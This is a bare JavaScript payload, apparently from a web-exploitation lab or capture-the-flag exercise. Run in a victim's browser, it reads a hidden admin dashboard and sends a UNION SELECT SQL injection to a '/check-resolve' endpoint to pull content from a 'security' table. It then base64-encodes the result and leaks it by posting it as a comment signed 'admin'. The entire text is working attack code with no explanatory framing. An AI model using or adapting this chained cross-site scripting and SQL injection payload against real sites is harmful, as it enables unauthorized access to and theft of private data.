fetch("/secret-security-dashboard")
  .then(response => response.text()) 
  .then(adminData => {
    return fetch("/check-resolve", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: "id=1%20UNION%20SELECT%20content%20FROM%20security%20WHERE%20id%20%3d%206",
    })
    .then(response => response.text())
    .then(checkResolveData => {
      const postData = new URLSearchParams({
        comment2: btoa(checkResolveData), 
        "comment-author": "admin"
      });
      return fetch("/post-comment", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: postData,
      });
    });
  });
